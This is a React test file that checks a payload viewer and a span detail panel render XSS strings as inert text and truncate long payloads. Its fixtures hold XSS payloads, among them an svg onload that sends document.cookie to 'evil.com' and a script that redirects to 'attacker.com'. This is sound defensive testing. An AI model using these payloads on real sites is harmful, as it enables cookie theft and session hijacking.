import { describe, it, expect } from 'vitest'
import { render, screen, fireEvent } from '@testing-library/react'
import React from 'react'
import { SafePayloadViewer } from '../components/SafePayloadViewer'
import { SpanDetailPanel } from '../components/SpanDetailPanel'
import { Span } from '../types'

describe('SafePayloadViewer - Plain-Text XSS Immunity & Truncation', () => {
  it('renders raw <script> and <img onerror> attack payloads as plain text without DOM injection', () => {
    const maliciousPayload = {
      attack1: "<script>alert('xss_attack_executed')</script>",
      attack2: '<img src="invalid_image.jpg" onerror="alert(document.cookie)" />',
      attack3: '<svg onload="fetch(\'http://evil.com/steal?data=\'+document.cookie)">',
      nested: {
        raw_html: '<iframe src="javascript:alert(1)"></iframe>',
      },
    }

    const { container } = render(<SafePayloadViewer payload={maliciousPayload} />)

    // 1. CRITICAL: DOM must NOT contain any script, img, svg, or iframe elements
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('svg')).toBeNull()
    expect(container.querySelector('iframe')).toBeNull()

    // 2. The literal HTML attack strings must exist purely as uninterpreted textContent
    const preEl = screen.getByTestId('safe-payload-content')
    expect(preEl.textContent).toContain("<script>alert('xss_attack_executed')</script>")
    expect(preEl.textContent).toContain('<img src=\\"invalid_image.jpg\\" onerror=\\"alert(document.cookie)\\" />')
    expect(preEl.textContent).toContain('<svg onload=\\"fetch(\'http://evil.com/steal?data=\'+document.cookie)\\">')
  })

  it('renders direct raw string <script> and <img onerror> payloads safely without DOM creation', () => {
    const rawAttack = '<script>alert("direct_script")</script><img src=x onerror=alert(1)>'
    const { container } = render(<SafePayloadViewer payload={rawAttack} />)

    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()

    const preEl = screen.getByTestId('safe-payload-content')
    expect(preEl.textContent).toBe(rawAttack)
  })


  it('renders attack payloads inside SpanDetailPanel safely as plain text', () => {
    const maliciousSpan: Span = {
      id: 'span-xss-1',
      run_id: 'run-1',
      sequence_number: 1,
      parent_span_id: null,
      policy_version_id: 'v1',
      span_type: 'tool',
      name: 'bash_eval',
      input_payload: { cmd: "<script>document.location='http://attacker.com'</script>" },
      output_payload: "<img src=x onerror=alert('pwned')>",
      started_at: new Date().toISOString(),
      ended_at: new Date().toISOString(),
      latency_ms: 25,
      token_counts: {},
      error: '<script>alert("error_injection")</script>',
      redaction_count: 0,
      policy_decision: 'deny',
      policy_rule_id: 'block_shell',
    }

    const { container } = render(<SpanDetailPanel span={maliciousSpan} onClose={() => {}} />)

    // Ensure zero script or image elements rendered anywhere in the span panel
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()

    // Plain text is preserved
    expect(container.textContent).toContain("<script>document.location='http://attacker.com'</script>")
    expect(container.textContent).toContain("<img src=x onerror=alert('pwned')>")
    expect(container.textContent).toContain('<script>alert("error_injection")</script>')
  })

  it('truncates long payloads and toggles expansion via the expand control', () => {
    const longString = 'A'.repeat(500)
    render(<SafePayloadViewer payload={longString} maxChars={100} />)

    const preEl = screen.getByTestId('safe-payload-content')
    // Initially truncated: 100 characters + '...'
    expect(preEl.textContent).toBe('A'.repeat(100) + '...')

    const toggleBtn = screen.getByTestId('expand-toggle-btn')
    expect(toggleBtn.textContent).toContain('Show more')

    // Click to expand
    fireEvent.click(toggleBtn)
    expect(preEl.textContent).toBe(longString)
    expect(toggleBtn.textContent).toBe('Show less')

    // Click to collapse
    fireEvent.click(toggleBtn)
    expect(preEl.textContent).toBe('A'.repeat(100) + '...')
  })
})
